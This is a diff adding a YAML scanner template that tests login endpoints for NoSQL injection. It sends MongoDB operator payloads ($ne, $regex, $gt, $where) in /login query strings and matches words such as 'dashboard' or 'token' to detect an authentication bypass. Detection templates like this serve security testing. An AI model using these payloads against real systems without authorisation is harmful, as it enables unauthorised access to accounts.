@@ -1,0 +1,50 @@
+id: vf-crit-nosql-01
+
+name: Advanced NoSQL Injection
+
+severity: Critical
+
+category: Injection
+
+requests:
+
+  - id: mongo-ne
+    method: GET
+    path: "/login?username[$ne]=1&password[$ne]=1"
+    matchers:
+      type: word
+      words:
+        - "dashboard"
+        - "welcome"
+        - "token"
+
+  - id: mongo-regex
+    method: GET
+    path: "/login?username[$regex]=.*&password[$regex]=.*"
+    matchers:
+      type: word
+      words:
+        - "dashboard"
+        - "welcome"
+
+  - id: mongo-gt
+    method: GET
+    path: "/login?username[$gt]=&password[$gt]="
+    matchers:
+      type: word
+      words:
+        - "success"
+
+  - id: mongo-where
+    method: GET
+    path: "/login?$where=1==1"
+    matchers:
+      type: word
+      words:
+        - "dashboard"
+
+metadata:
+
+  databases:
+    - MongoDB
+    - CouchDB
